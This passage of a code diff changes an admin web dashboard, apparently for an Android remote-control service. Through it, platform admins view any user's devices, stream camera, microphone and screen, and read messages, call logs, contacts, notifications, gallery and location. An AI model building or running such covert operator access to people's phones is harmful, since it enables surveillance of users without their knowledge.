@@ -7,7 +7,7 @@ import {
   signInWithEmailAndPassword,
   signOut,
 } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
-import { startAdminLiveViewer } from "./live.js?v=2";
+import { startAdminLiveViewer } from "./live.js?v=3";
 
 const viewLogin = document.getElementById("view-login");
 const viewDenied = document.getElementById("view-denied");
@@ -28,8 +28,14 @@ let activeTab = "dashboard";
 let cachedUsers = [];
 /** @type {{ stop: () => Promise<void> } | null} */
 let liveViewer = null;
-/** @type {{ ownerUid: string, deviceId: string, data: object } | null} */
+/** @type {string} */
+let openUserUid = "";
+/** @type {object | null} */
+let userDetailCache = null;
+/** @type {{ ownerUid: string, deviceId: string, data: object, devices: object[] } | null} */
 let exploreCtx = null;
+/** @type {string} */
+let activePhoneTab = "camera";
 
 function show(el, on) {
   if (!el) return;
@@ -44,6 +50,14 @@ function fmtTime(ms) {
   } catch {
     return "—";
   }
+}
+
+function escapeHtml(s) {
+  return String(s ?? "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
 }
 
 class ApiError extends Error {
@@ -84,16 +98,25 @@ function formatApiError(e) {
   return e instanceof Error ? e.message : String(e);
 }
 
+function setUsersSubview(which) {
+  show(document.getElementById("users-list-view"), which === "list");
+  show(document.getElementById("user-detail-view"), which === "user");
+  show(document.getElementById("device-control-view"), which === "device");
+}
+
 function setTab(tab) {
   activeTab = tab;
-  document.querySelectorAll(".admin-tab").forEach((btn) => {
+  document.querySelectorAll("#admin-main-tabs .admin-tab").forEach((btn) => {
     btn.classList.toggle("active", btn.getAttribute("data-tab") === tab);
   });
   document.querySelectorAll(".admin-panel").forEach((panel) => {
     panel.hidden = panel.id !== `tab-${tab}`;
   });
   if (tab === "dashboard") void loadDashboard();
-  if (tab === "users") void loadUsers();
+  if (tab === "users") {
+    setUsersSubview("list");
+    void loadUsers();
+  }
   if (tab === "admins") void loadAdmins();
 }
 
@@ -199,32 +222,25 @@ async function loadAdmins() {
   }
 }
 
-function closeDrawer() {
-  show(document.getElementById("user-drawer"), false);
-}
-
-function wireDeviceDrawer() {
-  document.getElementById("btn-device-drawer-close")?.addEventListener("click", closeDeviceDrawer);
-  document.getElementById("device-drawer")?.addEventListener("click", (ev) => {
-    if (ev.target === document.getElementById("device-drawer")) closeDeviceDrawer();
-  });
-}
-
+/** Open user → expand all devices full page (no side drawer). */
 async function openUser(uid) {
   if (!uid) return;
-  const drawer = document.getElementById("user-drawer");
-  const body = document.getElementById("drawer-body");
-  const title = document.getElementById("drawer-title");
-  const sub = document.getElementById("drawer-sub");
-  const actions = document.getElementById("drawer-actions");
-  show(drawer, true);
-  if (body) body.textContent = "Loading…";
+  openUserUid = uid;
+  void stopLiveViewer();
+  exploreCtx = null;
+  setUsersSubview("user");
+  const title = document.getElementById("user-detail-title");
+  const sub = document.getElementById("user-detail-sub");
+  const actions = document.getElementById("user-detail-actions");
+  const body = document.getElementById("user-detail-body");
+  if (body) body.innerHTML = `<p class="muted">Loading devices…</p>`;
   try {
     const data = await api(`/api/admin/users/${encodeURIComponent(uid)}`);
+    userDetailCache = data;
     const u = data.user || {};
     if (title) title.textContent = u.email || u.uid;
     if (sub) {
-      sub.textContent = `${u.blocked ? "Blocked" : "Active"} · ${u.deviceCount || 0} device(s) · last seen ${fmtTime(u.lastSeenAt)}`;
+      sub.textContent = `${u.blocked ? "Blocked" : "Active"} · ${Number(u.deviceCount || 0)} device(s) · last seen ${fmtTime(u.lastSeenAt)}`;
     }
     if (actions) {
       actions.innerHTML = u.blocked
@@ -252,84 +268,125 @@ async function openUser(uid) {
         await loadDashboard();
       });
     }
-
-    const devices = data.devices || [];
-    const clients = data.trustedClients || [];
-    const sessions = data.sessions || [];
-    const audits = data.auditLogs || [];
-
-    if (body) {
-      body.innerHTML = `
-        <h3>Devices</h3>
-        <p class="muted">Open a device to explore data and control it (does not revoke user browsers).</p>
-        ${
-          devices.length
-            ? `<ul>${devices
-                .map(
-                  (d) =>
-                    `<li style="margin-bottom:10px;">
-                      <strong>${escapeHtml(d.deviceName || d.deviceId)}</strong> — ${escapeHtml(d.deviceModel || "")} · ${d.online ? "online" : "offline"} · app ${escapeHtml(d.appVersion || "?")} ${d.revoked ? "· revoked" : ""}
-                      <div style="margin-top:6px;">
-                        <button type="button" class="btn-primary btn-explore-device" data-uid="${escapeHtml(uid)}" data-device="${escapeHtml(d.deviceId)}" ${d.revoked ? "disabled" : ""}>Explore &amp; control</button>
-                      </div>
-                    </li>`
-                )
-                .join("")}</ul>`
-            : `<p>No devices registered.</p>`
-        }
-        <h3>Trusted browsers</h3>
-        ${
-          clients.length
-            ? `<ul>${clients
-                .map(
-                  (c) =>
-                    `<li>${escapeHtml(c.label || c.clientId)} — ${escapeHtml(c.browserName || "")} / ${escapeHtml(c.operatingSystem || "")} ${c.revoked ? "· revoked" : ""}${c.clientId === "platform_admin" || c.isPlatformAdminClient ? " · <em>admin</em>" : ""}</li>`
-                )
-                .join("")}</ul>`
-            : `<p>No trusted browsers.</p>`
-        }
-        <h3>Recent sessions</h3>
-        ${
-          sessions.length
-            ? `<ul>${sessions
-                .slice(0, 15)
-                .map(
-                  (s) =>
-                    `<li>${escapeHtml(s.sessionKind || "session")} · ${escapeHtml(s.status || "")} · ${fmtTime(s.createdAt)}</li>`
-                )
-                .join("")}</ul>`
-            : `<p>No sessions.</p>`
-        }
-        <h3>Recent audit</h3>
-        ${
-          audits.length
-            ? `<ul>${audits
-                .slice(0, 20)
-                .map((a) => `<li>${escapeHtml(a.action || "?")} · ${fmtTime(a.at)}</li>`)
-                .join("")}</ul>`
-            : `<p>No audit logs.</p>`
-        }
-        ${
-          u.blocked
-            ? `<h3>Block info</h3><p>${escapeHtml(u.blockedReason || "")}<br/><span class="muted">by ${escapeHtml(u.blockedBy || "?")} at ${fmtTime(u.blockedAt)}</span></p>`
-            : ""
-        }
-      `;
-      body.querySelectorAll(".btn-explore-device").forEach((btn) => {
-        btn.addEventListener("click", () => {
-          void openDeviceExplore(btn.getAttribute("data-uid"), btn.getAttribute("data-device"));
-        });
-      });
-    }
+    renderUserDetailBody(uid, data);
   } catch (e) {
-    if (body) body.textContent = e instanceof Error ? e.message : String(e);
+    if (body) body.innerHTML = `<p class="error">${escapeHtml(formatApiError(e))}</p>`;
   }
 }
 
-function closeDeviceDrawer() {
-  void stopLiveViewer();
-  show(document.getElementById("device-drawer"), false);
-  exploreCtx = null;
+function renderUserDetailBody(uid, data) {
+  const body = document.getElementById("user-detail-body");
+  if (!body) return;
+  const devices = data.devices || [];
+  const clients = data.trustedClients || [];
+  const sessions = data.sessions || [];
+  const audits = data.auditLogs || [];
+  const u = data.user || {};
+
+  const deviceCards = devices.length
+    ? devices
+        .map((d) => {
+          const online = Boolean(d.online);
+          const name = escapeHtml(d.deviceName || d.deviceId);
+          const model = escapeHtml(
+            [d.manufacturer, d.deviceModel].filter(Boolean).join(" ") || "Unknown model"
+          );
+          return `<article class="surface admin-device-card">
+            <div class="admin-device-card-head">
+              <div>
+                <h3>${name}</h3>
+                <p class="muted">${model} · Android ${escapeHtml(d.androidVersion || "?")} · App ${escapeHtml(d.appVersion || "?")}</p>
+              </div>
+              <div class="row-gap">
+                <span class="pill ${online ? "online" : "offline"}">${online ? "Online" : "Offline"}</span>
+                <span class="pill">${d.remoteControlEnabled === false ? "Remote off" : "Remote on"}</span>
+                ${d.revoked ? `<span class="admin-badge danger">Revoked</span>` : ""}
+              </div>
+            </div>
+            <p class="admin-device-meta">
+              Battery ${d.batteryLevel != null ? `${Number(d.batteryLevel)}%` : "—"}
+              · Network ${escapeHtml(d.networkType || "unknown")}
+              · Last seen ${escapeHtml(fmtTime(d.lastSeenAt))}
+              · Camera ${escapeHtml(d.cameraPermission || (d.cameraAvailable !== false ? "ready" : "n/a"))}
+              · Mic ${escapeHtml(d.microphonePermission || (d.microphoneAvailable !== false ? "ready" : "n/a"))}
+            </p>
+            <div class="page-actions" style="margin-top:12px;">
+              <button type="button" class="btn-primary btn-explore-device"
+                data-uid="${escapeHtml(uid)}" data-device="${escapeHtml(d.deviceId)}"
+                ${d.revoked ? "disabled" : ""}>Explore &amp; control</button>
+            </div>
+          </article>`;
+        })
+        .join("")
+    : `<div class="surface muted">No devices registered for this user.</div>`;
+
+  body.innerHTML = `
+    <h2 class="settings-section-title">All devices</h2>
+    <p class="muted" style="margin-top:0;">Open Explore &amp; control for the full My Phone tabs (camera, location, gallery, …). User browsers stay paired.</p>
+    <div class="admin-device-grid">${deviceCards}</div>
+
+    <h2 class="settings-section-title">Trusted browsers</h2>
+    <div class="surface">
+      ${
+        clients.length
+          ? `<ul class="admin-readable-list">${clients
+              .map((c) => {
+                const admin =
+                  c.clientId === "platform_admin" || c.isPlatformAdminClient
+                    ? ' <span class="admin-badge ok">Admin</span>'
+                    : "";
+                return `<li>
+                  <strong>${escapeHtml(c.label || c.clientName || c.clientId)}</strong>
+                  ${admin}
+                  <span class="muted"> — ${escapeHtml(c.browserName || "")} / ${escapeHtml(c.operatingSystem || "")}${c.revoked ? " · revoked" : ""}</span>
+                </li>`;
+              })
+              .join("")}</ul>`
+          : `<p class="muted">No trusted browsers.</p>`
+      }
+    </div>
+
+    <h2 class="settings-section-title">Recent sessions</h2>
+    <div class="surface">
+      ${
+        sessions.length
+          ? `<ul class="admin-readable-list">${sessions
+              .slice(0, 15)
+              .map(
+                (s) =>
+                  `<li><strong>${escapeHtml(s.sessionKind || "session")}</strong> · ${escapeHtml(s.status || "")} · <span class="muted">${fmtTime(s.createdAt || s.startedAt)}</span></li>`
+              )
+              .join("")}</ul>`
+          : `<p class="muted">No sessions.</p>`
+      }
+    </div>
+
+    <h2 class="settings-section-title">Recent audit</h2>
+    <div class="surface">
+      ${
+        audits.length
+          ? `<ul class="admin-readable-list">${audits
+              .slice(0, 20)
+              .map((a) => `<li>${escapeHtml(a.action || "?")} · <span class="muted">${fmtTime(a.at)}</span></li>`)
+              .join("")}</ul>`
+          : `<p class="muted">No audit logs.</p>`
+      }
+    </div>
+
+    ${
+      u.blocked
+        ? `<h2 class="settings-section-title">Block info</h2>
+           <div class="surface"><p>${escapeHtml(u.blockedReason || "")}</p>
+           <p class="muted">by ${escapeHtml(u.blockedBy || "?")} at ${fmtTime(u.blockedAt)}</p></div>`
+        : ""
+    }
+  `;
+
+  body.querySelectorAll(".btn-explore-device").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      void openDeviceExplore(btn.getAttribute("data-uid"), btn.getAttribute("data-device"));
+    });
+  });
 }
 
 async function stopLiveViewer() {
@@ -345,189 +402,529 @@ async function stopLiveViewer() {
 
 async function openDeviceExplore(ownerUid, deviceId) {
   if (!ownerUid || !deviceId) return;
-  const drawer = document.getElementById("device-drawer");
-  const body = document.getElementById("device-drawer-body");
-  const title = document.getElementById("device-drawer-title");
-  const sub = document.getElementById("device-drawer-sub");
-  show(drawer, true);
-  if (body) body.textContent = "Loading device…";
+  setUsersSubview("device");
+  const ownerEl = document.getElementById("device-control-owner");
+  if (ownerEl) {
+    const email = userDetailCache?.user?.email || ownerUid;
+    ownerEl.textContent = `Controlling ${email} · Platform Admin client (user browsers stay paired).`;
+  }
+  const cam = document.getElementById("admin-camera-body");
+  if (cam) cam.innerHTML = `<p class="muted">Loading device…</p>`;
   try {
     const data = await api(
       `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}`
     );
-    exploreCtx = { ownerUid, deviceId, data };
-    const d = data.device || {};
-    if (title) title.textContent = d.deviceName || deviceId;
-    if (sub) {
-      sub.textContent = `${d.deviceModel || ""} · ${d.online ? "online" : "offline"} · ${ownerUid}`;
-    }
-    renderDeviceExplore("overview");
+    const devices = userDetailCache?.devices || [data.device];
+    exploreCtx = { ownerUid, deviceId, data, devices };
+    fillDeviceSelect(devices, deviceId);
+    setPhoneTab(activePhoneTab || "camera");
+    renderAllPhonePanels();
   } catch (e) {
-    if (body) body.textContent = formatApiError(e);
+    if (cam) cam.innerHTML = `<p class="error">${escapeHtml(formatApiError(e))}</p>`;
   }
 }
 
-function renderDeviceExplore(tab) {
-  const body = document.getElementById("device-drawer-body");
-  if (!body || !exploreCtx) return;
-  const { ownerUid, deviceId, data } = exploreCtx;
-  const d = data.device || {};
-  const tabs = [
-    ["overview", "Overview"],
-    ["live", "Live"],
-    ["controls", "Controls"],
-    ["messages", "Messages"],
-    ["calls", "Call logs"],
-    ["contacts", "Contacts"],
-    ["notifications", "Notifications"],
-    ["apps", "Apps"],
-    ["limits", "What’s possible"],
-  ];
-  const tabBar = tabs
-    .map(
-      ([id, label]) =>
-        `<button type="button" data-dtab="${id}" class="${id === tab ? "active" : ""}">${label}</button>`
-    )
+function fillDeviceSelect(devices, selectedId) {
+  const sel = document.getElementById("admin-device-select");
+  const hint = document.getElementById("admin-device-hint");
+  if (!sel) return;
+  sel.innerHTML = (devices || [])
+    .map((d) => {
+      const id = d.deviceId || d.id;
+      const label = `${d.deviceName || id}${d.online ? " (online)" : " (offline)"}`;
+      return `<option value="${escapeHtml(id)}" ${id === selectedId ? "selected" : ""}>${escapeHtml(label)}</option>`;
+    })
     .join("");
-
-  let panel = "";
-  if (tab === "overview") {
-    panel = `
-      <div class="admin-cmd-row">
-        <button type="button" class="btn-secondary" id="btn-dev-refresh">Refresh data</button>
-        <button type="button" class="btn-secondary" id="btn-dev-sync-info">Sync device info</button>
-        <button type="button" class="btn-secondary" id="btn-dev-sync-loc">Request location</button>
-      </div>
-      <p id="device-action-status" class="muted" aria-live="polite"></p>
-      <h3>Device</h3>
-      <pre class="admin-pre">${escapeHtml(JSON.stringify(d, null, 2))}</pre>
-      <h3>Device info (cached)</h3>
-      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.deviceInfo || { note: "No cached info — tap Sync device info" }, null, 2))}</pre>
-      <h3>Location (cached)</h3>
-      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.location || { note: "No cached location — tap Request location" }, null, 2))}</pre>
-      <h3>Active sessions</h3>
-      <pre class="admin-pre">${escapeHtml(JSON.stringify(data.activeSessions || [], null, 2))}</pre>
-    `;
-  } else if (tab === "live") {
-    panel = `
-      <p class="muted">Starts live media via Platform Admin client. User browsers stay paired. Screen capture still needs Android system consent on the phone.</p>
-      <div class="admin-cmd-row">
-        <button type="button" class="btn-primary" id="btn-live-cam">Start camera + mic</button>
-        <button type="button" class="btn-secondary" id="btn-live-screen">Start screen mirror</button>
-        <button type="button" class="btn-danger-soft" id="btn-live-stop">Stop live</button>
-      </div>
-      <p id="live-status" class="muted" aria-live="polite"></p>
-      <video id="admin-live-video" class="admin-live-video" autoplay playsinline muted></video>
-    `;
-  } else if (tab === "controls") {
-    panel = `
-      <p class="muted">These commands do not revoke user browsers. They may briefly wake the phone app.</p>
-      <div class="admin-cmd-row">
-        <button type="button" class="btn-secondary" data-action="DEVICE_INFO_REFRESH">Sync info</button>
-        <button type="button" class="btn-secondary" data-action="LOCATION_GET_CURRENT">Location now</button>
-        <button type="button" class="btn-secondary" data-action="MESSAGES_SYNC">Sync messages</button>
-        <button type="button" class="btn-secondary" data-action="CALL_LOGS_SYNC">Sync call logs</button>
-        <button type="button" class="btn-secondary" data-action="CONTACTS_SYNC">Sync contacts</button>
-        <button type="button" class="btn-secondary" data-action="NOTIFICATIONS_SYNC">Sync notifications</button>
-        <button type="button" class="btn-secondary" data-action="APPS_INDEX">Sync apps</button>
-        <button type="button" class="btn-secondary" data-action="SCREEN_LOCK">Lock screen</button>
-        <button type="button" class="btn-secondary" data-action="SCREEN_UNLOCK">Unlock / wake</button>
-      </div>
-      <p id="device-action-status" class="muted" aria-live="polite"></p>
-      <p class="muted">Remote touch / accessibility: use the user’s website with their paired browser if deep remote control is already set up, or enable Accessibility on the phone then use A11y commands from a future admin build. Lock/unlock and sync work from here without extra pairing.</p>
-    `;
-  } else if (tab === "messages") {
-    panel = listPanel("Messages", data.messages, "Sync messages from Controls if empty.");
-  } else if (tab === "calls") {
-    panel = listPanel("Call logs", data.callLogs, "Sync call logs from Controls if empty.");
-  } else if (tab === "contacts") {
-    panel = listPanel("Contacts", data.contacts, "Sync contacts from Controls if empty.");
-  } else if (tab === "notifications") {
-    panel = listPanel("Notifications", data.notifications, "Sync notifications from Controls if empty.");
-  } else if (tab === "apps") {
-    panel = listPanel("Installed apps", data.apps, "Sync apps from Controls if empty.");
-  } else if (tab === "limits") {
-    panel = `<h3>What’s possible</h3>${(data.limitations || [])
-      .map(
-        (l) => `<div class="admin-limit-card">
-          <strong>${escapeHtml(l.feature)} — ${l.possible ? "Possible" : "Blocked"}</strong>
-          <span class="muted">${escapeHtml(l.note)}</span>
-        </div>`
-      )
-      .join("")}`;
+  const d = (devices || []).find((x) => (x.deviceId || x.id) === selectedId) || {};
+  if (hint) {
+    hint.textContent = [
+      [d.manufacturer, d.deviceModel].filter(Boolean).join(" "),
+      d.androidVersion ? `Android ${d.androidVersion}` : "",
+      d.batteryLevel != null ? `battery ${d.batteryLevel}%` : "",
+    ]
+      .filter(Boolean)
+      .join(" · ");
   }
+}
 
-  body.innerHTML = `<div class="admin-device-tabs">${tabBar}</div><div>${panel}</div>`;
-  body.querySelectorAll("[data-dtab]").forEach((btn) => {
-    btn.addEventListener("click", () => renderDeviceExplore(btn.getAttribute("data-dtab") || "overview"));
+function setPhoneTab(tab) {
+  activePhoneTab = tab;
+  document.querySelectorAll("#admin-phone-tabs .phone-tab").forEach((btn) => {
+    const on = btn.getAttribute("data-phone-tab") === tab;
+    btn.classList.toggle("active", on);
+    btn.setAttribute("aria-selected", on ? "true" : "false");
   });
+  document.querySelectorAll("#device-control-view .phone-tab-panel").forEach((panel) => {
+    panel.hidden = panel.getAttribute("data-phone-panel") !== tab;
+  });
+}
 
-  document.getElementById("btn-dev-refresh")?.addEventListener("click", () => {
-    void openDeviceExplore(ownerUid, deviceId);
+function kvRows(obj, keys) {
+  if (!obj || typeof obj !== "object") return "";
+  const entries = keys
+    ? keys.map(([k, label]) => [label || k, obj[k]])
+    : Object.entries(obj).map(([k, v]) => [k, v]);
+  return entries
+    .filter(([, v]) => v !== undefined && v !== null && v !== "")
+    .map(([label, v]) => {
+      let display = v;
+      if (typeof v === "boolean") display = v ? "Yes" : "No";
+      else if (typeof v === "object") display = JSON.stringify(v);
+      else if (typeof v === "number" && String(label).toLowerCase().includes("at")) {
+        display = fmtTime(v);
+      } else display = String(v);
+      return `<div class="admin-kv"><span class="muted">${escapeHtml(label)}</span><strong>${escapeHtml(display)}</strong></div>`;
+    })
+    .join("");
+}
+
+function emptyHint(text) {
+  return `<p class="muted">${escapeHtml(text)}</p>`;
+}
+
+function renderAllPhonePanels() {
+  if (!exploreCtx) return;
+  renderCameraPanel();
+  renderLocationPanel();
+  renderInfoPanel();
+  renderGalleryPanel();
+  renderNotificationsPanel();
+  renderMessagesPanel();
+  renderCallLogsPanel();
+  renderContactsPanel();
+  renderFilesPanel();
+  renderScreenPanel();
+  renderRecordingPanel();
+  renderAppsPanel();
+  wireAdminCommands();
+}
+
+function renderCameraPanel() {
+  const el = document.getElementById("admin-camera-body");
+  if (!el || !exploreCtx) return;
+  const d = exploreCtx.data.device || {};
+  const cam =
+    d.cameraPermission || (d.cameraAvailable !== false ? "granted" : "missing");
+  const mic =
+    d.microphonePermission || (d.microphoneAvailable !== false ? "granted" : "missing");
+  el.innerHTML = `
+    <article class="device-card surface" style="padding:16px;">
+      <h3>${escapeHtml(d.deviceName || exploreCtx.deviceId)}</h3>
+      <div class="device-meta">
+        <span class="pill ${d.online ? "online" : "offline"}">${d.online ? "Online" : "Offline"}</span>
+        <span class="pill">${d.remoteControlEnabled === false ? "Remote off" : "Remote on"}</span>
+        <span>${escapeHtml(d.manufacturer || "")} ${escapeHtml(d.deviceModel || "")}</span>
+        <span>Android ${escapeHtml(d.androidVersion || "?")}</span>
+        <span>App ${escapeHtml(d.appVersion || "?")}</span>
+        <span>Battery ${d.batteryLevel != null ? `${Number(d.batteryLevel)}%` : "—"}${d.isCharging ? " (charging)" : ""}</span>
+        <span>Network ${escapeHtml(d.networkType || "unknown")}</span>
+        <span>Last seen ${escapeHtml(fmtTime(d.lastSeenAt))}</span>
+        <span>Camera ${escapeHtml(cam)} · Mic ${escapeHtml(mic)}</span>
+      </div>
+      <div class="connect-panel" style="margin-top:12px;">
+        <div class="cap-row">
+          <label><input type="radio" name="admin-cap" value="both" checked /> Camera + mic</label>
+          <label><input type="radio" name="admin-cap" value="camera" /> Camera only</label>
+          <label><input type="radio" name="admin-cap" value="mic" /> Mic only</label>
+        </div>
+        <label>Preferred quality
+          <select id="admin-quality" class="quality-select input">
+            <option value="auto">Auto (720p)</option>
+            <option value="1080">1080p</option>
+            <option value="720" selected>720p</option>
+            <option value="480">480p</option>
+            <option value="360">360p</option>
+          </select>
+        </label>
+        <div class="connect-actions">
+          <button type="button" class="btn-primary" id="btn-admin-connect">Connect</button>
+          <button type="button" class="btn-danger" id="btn-admin-end-live" hidden>End Session</button>
+        </div>
+        <p id="live-status" class="live-status muted">Idle — tap Connect to start live view.</p>
+        <div class="live-panel" id="admin-live-panel" hidden>
+          <video id="admin-live-video" class="admin-live-video live-video" autoplay playsinline muted controls></video>
+        </div>
+      </div>
+    </article>
+  `;
+  document.getElementById("btn-admin-connect")?.addEventListener("click", () => {
+    const mode = document.querySelector('input[name="admin-cap"]:checked')?.value || "both";
+    const caps =
+      mode === "camera"
+        ? ["camera"]
+        : mode === "mic"
+          ? ["microphone"]
+          : ["camera", "microphone"];
+    const quality = document.getElementById("admin-quality")?.value || "auto";
+    void startLive(exploreCtx.ownerUid, exploreCtx.deviceId, caps, false, quality);
   });
-  document.getElementById("btn-dev-sync-info")?.addEventListener("click", () => {
-    void runDeviceCommand(ownerUid, deviceId, "DEVICE_INFO_REFRESH");
-  });
-  document.getElementById("btn-dev-sync-loc")?.addEventListener("click", () => {
-    void runDeviceCommand(ownerUid, deviceId, "LOCATION_GET_CURRENT");
-  });
-  body.querySelectorAll("[data-action]").forEach((btn) => {
-    btn.addEventListener("click", () => {
-      void runDeviceCommand(ownerUid, deviceId, btn.getAttribute("data-action"));
-    });
-  });
-  document.getElementById("btn-live-cam")?.addEventListener("click", () => {
-    void startLive(ownerUid, deviceId, ["camera", "microphone"], false);
-  });
-  document.getElementById("btn-live-screen")?.addEventListener("click", () => {
-    void startLive(ownerUid, deviceId, ["screenMirror"], false);
-  });
-  document.getElementById("btn-live-stop")?.addEventListener("click", async () => {
+  document.getElementById("btn-admin-end-live")?.addEventListener("click", async () => {
     await stopLiveViewer();
     const st = document.getElementById("live-status");
-    if (st) st.textContent = "Live viewer stopped.";
+    if (st) st.textContent = "Live session ended.";
+    show(document.getElementById("admin-live-panel"), false);
+    const endBtn = document.getElementById("btn-admin-end-live");
+    if (endBtn) endBtn.hidden = true;
   });
 }
 
-function listPanel(title, items, emptyHint) {
-  const arr = Array.isArray(items) ? items : [];
-  if (!arr.length) {
-    return `<h3>${escapeHtml(title)}</h3><p class="muted">${escapeHtml(emptyHint)}</p>`;
+function renderLocationPanel() {
+  const el = document.getElementById("admin-location-body");
+  if (!el || !exploreCtx) return;
+  const loc = exploreCtx.data.location;
+  const d = exploreCtx.data.device || {};
+  if (!loc || !Number.isFinite(Number(loc.latitude))) {
+    el.innerHTML = emptyHint(
+      d.locationSharingEnabled
+        ? "No GPS fix cached yet. Tap Update location, wait a few seconds, then Refresh."
+        : "Location sharing may be off on the phone. Tap Update location to request a fix."
+    );
+    return;
   }
-  return `<h3>${escapeHtml(title)} (${arr.length})</h3><pre class="admin-pre">${escapeHtml(
-    JSON.stringify(arr.slice(0, 40), null, 2)
-  )}</pre>`;
+  const lat = Number(loc.latitude);
+  const lng = Number(loc.longitude);
+  const maps = `https://www.google.com/maps?q=${lat},${lng}`;
+  el.innerHTML = `
+    <div class="admin-kv-grid">
+      ${kvRows(
+        {
+          Latitude: lat.toFixed(6),
+          Longitude: lng.toFixed(6),
+          Accuracy: loc.accuracy != null ? `${loc.accuracy} m` : "—",
+          Provider: loc.provider || "—",
+          Captured: fmtTime(loc.capturedAt || loc.updatedAt),
+        },
+        null
+      )}
+    </div>
+    <p style="margin-top:12px;"><a class="btn-primary" href="${maps}" target="_blank" rel="noopener">Open in Google Maps</a></p>
+  `;
+}
+
+function flattenInfo(info) {
+  if (!info || typeof info !== "object") return {};
+  const out = {};
+  const walk = (obj, prefix = "") => {
+    for (const [k, v] of Object.entries(obj)) {
+      if (k === "id" || k === "ownerUid") continue;
+      const key = prefix ? `${prefix}.${k}` : k;
+      if (v && typeof v === "object" && !Array.isArray(v)) walk(v, key);
+      else if (Array.isArray(v)) out[key] = v.slice(0, 8).join(", ");
+      else out[key] = v;
+    }
+  };
+  walk(info);
+  return out;
+}
+
+function renderInfoPanel() {
+  const el = document.getElementById("admin-info-body");
+  if (!el || !exploreCtx) return;
+  const d = exploreCtx.data.device || {};
+  const info = flattenInfo(exploreCtx.data.deviceInfo);
+  const sessions = exploreCtx.data.activeSessions || [];
+  el.innerHTML = `
+    <h2 class="settings-section-title" style="margin-top:0;">Device status</h2>
+    <div class="admin-kv-grid">
+      ${kvRows({
+        Name: d.deviceName,
+        Model: [d.manufacturer, d.deviceModel].filter(Boolean).join(" "),
+        Android: d.androidVersion,
+        "App version": d.appVersion,
+        Online: d.online,
+        "Remote control": d.remoteControlEnabled !== false,
+        Battery: d.batteryLevel != null ? `${d.batteryLevel}%` : "—",
+        Charging: d.isCharging,
+        Network: d.networkType,
+        "Last seen": fmtTime(d.lastSeenAt),
+        Camera: d.cameraPermission || (d.cameraAvailable !== false ? "ready" : "off"),
+        Microphone: d.microphonePermission || (d.microphoneAvailable !== false ? "ready" : "off"),
+        "Location sharing": d.locationSharingEnabled,
+        Gallery: d.galleryAccessEnabled,
+        "File manager": d.fileManagerEnabled,
+      })}
+    </div>
+    <h2 class="settings-section-title">Synced device information</h2>
+    ${
+      Object.keys(info).length
+        ? `<div class="admin-kv-grid">${kvRows(info)}</div>`
+        : emptyHint("No cached info yet. Tap Refresh Information, wait, then Refresh.")
+    }
+    <h2 class="settings-section-title">Active sessions</h2>
+    ${
+      sessions.length
+        ? `<ul class="admin-readable-list">${sessions
+            .map(
+              (s) =>
+                `<li><strong>${escapeHtml(s.sessionKind || "session")}</strong> · ${escapeHtml(s.status || "")} · client ${escapeHtml(s.clientId || "")} · ${fmtTime(s.startedAt || s.createdAt)}</li>`
+            )
+            .join("")}</ul>`
+        : emptyHint("No active sessions.")
+    }
+  `;
+}
+
+function renderGalleryPanel() {
+  const el = document.getElementById("admin-gallery-body");
+  if (!el || !exploreCtx) return;
+  const items = exploreCtx.data.gallery || [];
+  if (!items.length) {
+    el.innerHTML = emptyHint("No gallery items cached. Tap Request index, wait, then Refresh.");
+    return;
+  }
+  el.innerHTML = `<div class="admin-item-grid">${items
+    .slice(0, 60)
+    .map((g) => {
+      const name = g.displayName || g.name || g.id;
+      const type = g.type || g.mimeType || "file";
+      return `<article class="admin-item-card">
+        <strong>${escapeHtml(name)}</strong>
+        <span class="muted">${escapeHtml(type)}</span>
+        <span class="muted">${fmtTime(g.dateAdded || g.createdAt)}</span>
+        <span class="muted">${g.sizeBytes != null ? `${Math.round(Number(g.sizeBytes) / 1024)} KB` : ""}</span>
+      </article>`;
+    })
+    .join("")}</div>`;
+}
+
+function renderNotificationsPanel() {
+  const el = document.getElementById("admin-notifications-body");
+  if (!el || !exploreCtx) return;
+  const items = exploreCtx.data.notifications || [];
+  if (!items.length) {
+    el.innerHTML = emptyHint("No notifications cached. Tap Sync from phone.");
+    return;
+  }
+  el.innerHTML = `<ul class="admin-readable-list">${items
+    .slice(0, 50)
+    .map(
+      (n) =>
+        `<li>
+          <strong>${escapeHtml(n.appName || n.packageName || "App")}</strong>
+          <div>${escapeHtml(n.title || "")}</div>
+          <div class="muted">${escapeHtml(n.text || n.body || "")}</div>
+          <div class="muted">${fmtTime(n.postedAt || n.createdAt)}</div>
+        </li>`
+    )
+    .join("")}</ul>`;
+}
+
+function renderMessagesPanel() {
+  const el = document.getElementById("admin-messages-body");
+  if (!el || !exploreCtx) return;
+  const items = exploreCtx.data.messages || [];
+  if (!items.length) {
+    el.innerHTML = emptyHint("No messages cached. Tap Sync from phone.");
+    return;
+  }
+  el.innerHTML = `<ul class="admin-readable-list">${items
+    .slice(0, 50)
+    .map(
+      (m) =>
+        `<li>
+          <strong>${escapeHtml(m.address || m.contactName || "Unknown")}</strong>
+          <span class="muted"> · ${escapeHtml(m.type || m.direction || "")}</span>
+          <div>${escapeHtml(m.body || m.text || "")}</div>
+          <div class="muted">${fmtTime(m.date || m.createdAt)}</div>
+        </li>`
+    )
+    .join("")}</ul>`;
+}
+
+function renderCallLogsPanel() {
+  const el = document.getElementById("admin-call-logs-body");
+  if (!el || !exploreCtx) return;
+  const items = exploreCtx.data.callLogs || [];
+  if (!items.length) {
+    el.innerHTML = emptyHint("No call logs cached. Tap Sync from phone.");
+    return;
+  }
+  el.innerHTML = `<ul class="admin-readable-list">${items
+    .slice(0, 50)
+    .map(
+      (c) =>
+        `<li>
+          <strong>${escapeHtml(c.number || c.cachedName || "Unknown")}</strong>
+          <span class="muted"> · ${escapeHtml(c.type || "")} · ${escapeHtml(String(c.duration ?? ""))}s</span>
+          <div class="muted">${fmtTime(c.date || c.createdAt)}</div>
+        </li>`
+    )
+    .join("")}</ul>`;
+}
+
+function renderContactsPanel() {
+  const el = document.getElementById("admin-contacts-body");
+  if (!el || !exploreCtx) return;
+  const items = exploreCtx.data.contacts || [];
+  if (!items.length) {
+    el.innerHTML = emptyHint("No contacts cached. Tap Sync from phone.");
